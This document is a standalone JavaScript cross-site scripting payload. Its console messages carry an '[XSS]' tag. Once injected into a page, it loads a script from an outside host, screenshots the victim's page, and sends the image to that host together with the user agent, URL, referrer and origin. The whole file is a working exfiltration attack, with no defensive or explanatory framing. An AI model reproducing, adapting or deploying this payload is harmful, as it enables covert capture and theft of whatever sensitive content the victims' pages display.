(function(){
  function sendLog(screenshot) {
    const data = {
      screenshot: screenshot,
      userAgent: navigator.userAgent,
      url: window.location.href,
      time: new Date().toISOString(),
      referrer: document.referrer,
      origin: location.origin
    };

    console.log("[XSS] Sending payload to /log", data);

    fetch("https://anonys.onrender.com/log", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data),
      keepalive: true
    })
    .then(res => console.log("[XSS] POST success:", res.status))
    .catch(err => console.error("[XSS] POST error:", err));
  }

  function run() {
    console.log("[XSS] html2canvas ready, capturing...");

    html2canvas(document.body)
      .then(canvas => {
        console.log("[XSS] Screenshot captured");
        const img = canvas.toDataURL('image/png');
        sendLog(img);
      })
      .catch(err => {
        console.error("[XSS] Error during canvas capture:", err);
      });
  }

  if (typeof html2canvas === "undefined") {
    console.log("[XSS] Injecting html2canvas script...");

    const script = document.createElement("script");
    script.src = "https://anonys.onrender.com/html2canvas.min.js";
    script.onload = run;
    script.onerror = () => console.error("[XSS] Failed to load html2canvas.");
    document.head.appendChild(script);
  } else {
    run();
  }
})();
